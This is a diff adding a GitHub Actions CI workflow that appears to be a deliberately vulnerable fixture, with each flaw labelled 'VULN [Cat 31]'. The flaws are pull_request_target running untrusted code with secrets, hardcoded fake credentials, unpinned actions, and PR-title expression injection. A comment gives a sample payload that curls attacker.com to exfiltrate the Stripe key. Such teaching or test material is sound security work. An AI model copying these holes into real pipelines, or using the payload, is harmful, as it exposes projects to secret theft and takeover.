@@ -1,0 +1,57 @@
+# VULN [Cat 31]: Insecure CI/CD pipeline configuration
+name: CI
+
+# VULN [Cat 31]: pull_request_target runs with repo secrets on untrusted PR code
+on:
+  push:
+    branches: [main]
+  pull_request_target:
+    branches: [main]
+
+# VULN [Cat 31]: Hardcoded secrets in environment variables
+env:
+  DATABASE_URL: "postgresql://admin:SuperSecret123!@prod-db.vibehealth.dev:5432/vibehealth"
+  OPENAI_API_KEY: "sk-proj-FAKE-abc123def456ghi789jkl012mno345pqr678stu901vwx234"
+  STRIPE_SECRET_KEY: "sk_live_FAKE_51ABC123DEF456GHI789jklmnopqrstuvwxyz"
+  NEXTAUTH_SECRET: "my-super-secret-jwt-signing-key-2024"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      # VULN [Cat 31]: Unpinned third-party action - uses @master instead of SHA
+      - uses: actions/checkout@master
+        with:
+          # VULN [Cat 31]: Checks out PR head code which runs with repo secrets
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # VULN [Cat 31]: Unpinned action tag
+      - uses: actions/setup-node@master
+        with:
+          node-version: "18"
+
+      - run: npm ci
+      - run: npm run build
+
+      # VULN [Cat 31]: Expression injection - PR title is attacker-controlled
+      # An attacker can set PR title to: a]"; curl attacker.com/steal?secret=$STRIPE_SECRET_KEY; echo "[
+      - name: Report Status
+        run: |
+          echo "Building PR: ${{ github.event.pull_request.title }}"
+          echo "Author: ${{ github.event.pull_request.head.repo.full_name }}"
+
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    if: github.ref == 'refs/heads/main'
+
+    steps:
+      # VULN [Cat 31]: Unpinned action
+      - uses: actions/checkout@master
+      - run: npm ci && npm run build
+      # VULN [Cat 31]: Hardcoded deploy credentials
+      - run: |
+          curl -X POST https://api.vibehealth.dev/deploy \
+            -H "Authorization: Bearer vhd_deploy_token_prod_2024_xK9mN2pL" \
+            -d '{"version": "${{ github.sha }}"}'
